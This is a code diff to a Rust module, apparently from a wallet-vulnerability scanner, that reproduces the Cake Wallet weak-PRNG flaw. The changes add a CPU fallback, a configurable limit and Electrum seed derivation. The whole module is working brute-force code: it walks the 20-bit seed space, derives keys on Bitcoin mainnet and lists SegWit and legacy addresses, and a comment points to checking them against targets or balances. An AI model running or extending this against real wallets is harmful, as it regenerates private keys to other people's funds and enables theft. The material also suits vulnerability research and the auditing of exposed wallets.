@@ -1,5 +1,5 @@
 use anyhow::Result;
-use hex; // Added for hex::encode
+use tracing::{info, warn, error};
 
 #[cfg(test)]
 use bip39::Mnemonic;
@@ -15,30 +15,41 @@ use std::str::FromStr;
 /// Simulates the Cake Wallet vulnerability by generating wallets from a limited entropy source.
 /// The vulnerability was due to a weak PRNG with effectively 20 bits of entropy.
 /// We will simulate this by iterating through a subset of this space.
-pub fn run() -> Result<()> {
-    eprintln!("Reproducing Cake Wallet Vulnerability (Weak PRNG)...");
-    eprintln!("Simulating 20-bit entropy search...");
+pub fn run(limit: Option<u32>) -> Result<()> {
+    info!("Reproducing Cake Wallet Vulnerability (Weak PRNG)...");
+    info!("Simulating 20-bit entropy search...");
 
     // 20 bits = 1,048,576 possibilities
-    let max_entropy = 1 << 20;
+    // Allow overriding for testing
+    let max_entropy = limit.unwrap_or(1 << 20);
 
-    eprintln!("Scanning {} possible seeds with GPU...", max_entropy);
-    eprintln!("Starting GPU ACCELERATION...");
-
-    // Initialize GPU Solver
-    let solver = match crate::scans::gpu_solver::GpuSolver::new() {
-        Ok(s) => s,
-        Err(e) => {
-            eprintln!("Failed to initialize GPU solver: {}", e);
-            eprintln!("GPU Init Failed - falling back would take ~17 minutes on CPU");
-            return Err(anyhow::anyhow!("GPU Init Failed"));
+    info!("Scanning {} possible seeds...", max_entropy);
+    // Try to initialize GPU Solver
+    #[cfg(feature = "gpu")]
+    match crate::scans::gpu_solver::GpuSolver::new() {
+        Ok(solver) => {
+            info!("Starting GPU ACCELERATION...");
+            info!("GPU Kernel patched for Electrum Seed Support (purpose=0)");
+            return run_gpu(solver, max_entropy);
         }
-    };
+        Err(e) => {
+            error!("Failed to initialize GPU solver: {}", e);
+            warn!("Falling back to CPU implementation...");
+        }
+    }
 
+    #[cfg(not(feature = "gpu"))]
+    warn!("GPU feature disabled. Running on CPU (this will be slower)...");
+
+    run_cpu(max_entropy)
+}
+
+#[cfg(feature = "gpu")]
+fn run_gpu(solver: crate::scans::gpu_solver::GpuSolver, max_entropy: u32) -> Result<()> {
     let mut batch = Vec::with_capacity(1024);
 
     for i in 0..max_entropy {
-        // Create deterministic entropy from seed index (matching CPU logic)
+        // Create deterministic entropy from seed index
         let mut entropy = [0u8; 16];
         let seed_bytes = (i as u32).to_be_bytes();
         entropy[0..4].copy_from_slice(&seed_bytes);
@@ -47,20 +58,17 @@ pub fn run() -> Result<()> {
         batch.push(entropy);
 
         if batch.len() >= 1024 || i == max_entropy - 1 {
-            // Compute Cake Wallet addresses (purpose=0 for m/0'/0/0)
+            // Compute Cake Wallet addresses (purpose=0 for m/0'/0/0 + Electrum salt)
             if let Ok(addresses) = solver.compute_batch(&batch, 0) {
                 for addr in addresses.iter() {
-                    // Output for pipe to check_mnemonics.py
-                    // Format: ADDRESS: <hex>
-                    // Note: Cake uses Segwit (bc1...) so output is 20-byte witness program
-                    println!("ADDRESS: {}", hex::encode(addr));
+                    info!("ADDRESS: {}", hex::encode(addr));
                 }
             }
             batch.clear();
         }
 
         if (i + 1) % 10000 == 0 {
-            eprintln!(
+            info!(
                 "Progress: {}/{} ({:.1}%)",
                 i + 1,
                 max_entropy,
@@ -69,11 +77,76 @@ pub fn run() -> Result<()> {
         }
     }
 
-    eprintln!(
+    info!(
         "Scan complete! All {} keys generated from 20-bit space.",
         max_entropy
     );
 
+    Ok(())
+}
+
+fn run_cpu(max_entropy: u32) -> Result<()> {
+    use bitcoin::Network;
+    use bitcoin::secp256k1::Secp256k1;
+    use bitcoin::bip32::{DerivationPath, Xpriv};
+    use bip39::Mnemonic;
+    use std::str::FromStr;
+    use bitcoin::Address;
+    use crate::utils::electrum;
+
+    let secp = Secp256k1::new();
+    let network = Network::Bitcoin;
+    // Electrum derivation path for standard wallets is m/0'/0/0 (for first receive address)
+    // Note: Electrum uses m/0'/0/x for receiving, m/0'/1/x for change.
+    // We check the first receiving address.
+    let path = DerivationPath::from_str("m/0'/0/0")?;
+
+    info!("Starting CPU scan (this may take a while)...");
+
+    for i in 0..max_entropy {
+         // Create deterministic entropy from seed index
+         // Replicating Dart Random() behavior or just brute forcing the 20-bit space?
+         // The original code was iterating 0..max_entropy and using that as bytes.
+         // If "effectively 20 bits of entropy" means the seed is 20 bits padded, then this is correct.
+        let mut entropy_bytes = [0u8; 16]; 
+        let seed_bytes = (i as u32).to_be_bytes();
+        entropy_bytes[0..4].copy_from_slice(&seed_bytes);
+        
+        // Mnemonic from entropy
+        // Note: We assume the vulnerability resulted in BIP39 words, but derived as Electrum.
+        let mnemonic = Mnemonic::from_entropy(&entropy_bytes)?;
+        let mnemonic_str = mnemonic.to_string();
+        
+        // Electrum Seed Derivation
+        let seed_val = electrum::mnemonic_to_seed(&mnemonic_str);
+        
+        let root = Xpriv::new_master(network, &seed_val)?;
+        let child = root.derive_priv(&secp, &path)?;
+        let pubkey = child.to_keypair(&secp).public_key();
+        
+        // Check both P2WPKH (SegWit) and P2PKH (Legacy) addresses
+        // Cake Wallet versions may have used either format
+        let compressed_pubkey = bitcoin::CompressedPublicKey(pubkey);
+        let address_segwit = Address::p2wpkh(&compressed_pubkey, network);
+        let address_legacy = Address::p2pkh(compressed_pubkey, network);
+
+        // In a real scan we would check if this address matches a target or has balance.
+        // Since we are just generating, we log both formats.
+        
+        info!("ADDRESS_SEGWIT: {}", address_segwit);
+        info!("ADDRESS_LEGACY: {}", address_legacy);
+
+        if (i + 1) % 1000 == 0 {
+             info!(
+                "Progress: {}/{} ({:.1}%)",
+                i + 1,
+                max_entropy,
+                100.0 * (i + 1) as f64 / max_entropy as f64
+            );
+        }
+    }
+    
+    info!("CPU scan complete.");
     Ok(())
 }
 
@@ -90,7 +163,10 @@ mod tests {
         entropy[0..4].copy_from_slice(&(i as u32).to_be_bytes());
 
         let mnemonic = Mnemonic::from_entropy(&entropy[0..16]).unwrap();
-        let seed = mnemonic.to_seed("");
+        // Use Electrum seed derivation
+        let mnemonic_str = mnemonic.to_string();
+        let seed = crate::utils::electrum::mnemonic_to_seed(&mnemonic_str);
+        
         let network = Network::Bitcoin;
         let secp = Secp256k1::new();
         let root = Xpriv::new_master(network, &seed).unwrap();
